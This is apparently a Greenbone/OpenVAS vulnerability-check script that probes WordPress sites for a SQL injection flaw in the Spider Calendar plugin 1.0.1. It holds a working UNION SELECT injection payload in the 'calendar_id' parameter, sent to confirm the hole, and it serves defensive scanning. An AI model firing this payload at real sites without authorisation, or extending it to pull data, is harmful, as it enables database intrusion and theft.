CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803101" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_bugtraq_id( 55779 );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-10-18 19:07:20 +0530 (Thu, 18 Oct 2012)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WordPress Spider Calendar Plugin Multiple SQL Injection Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/50812" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/79042" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/21715/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/117078/WordPress-Spider-1.0.1-SQL-Injection-XSS.html" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to manipulate SQL queries by
  injecting arbitrary SQL code and gain sensitive information." );
	script_tag( name: "affected", value: "WordPress Spider Calendar Plugin version 1.0.1" );
	script_tag( name: "insight", value: "Input passed via the 'calendar_id' parameter to
  'front_end/spidercalendarbig_seemore.php' (when 'ev_ids' is set to the id
  of an available event) is not properly sanitised before being used in a SQL
  query." );
	script_tag( name: "solution", value: "Update to WordPress Spider Calendar Plugin version 1.1.0 or later." );
	script_tag( name: "summary", value: "This host is running WordPress Spider Calendar Plugin and is prone to
  multiple SQL Injection vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/spider-calendar/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
for plugin in make_list( "spider-calendar",
	 "calendar" ) {
	url = dir + "/wp-content/plugins/" + plugin + "/front_end/spidercalendarbig_seemore.php?theme_id=5&ev_ids=1&calendar_id=null%20union%20all%20select%201,1,1,1,0x53514c692d54657374,1,1,1,1,1,1,1,1,1,1,1,1+--+";
	if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "SQLi-Test<" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

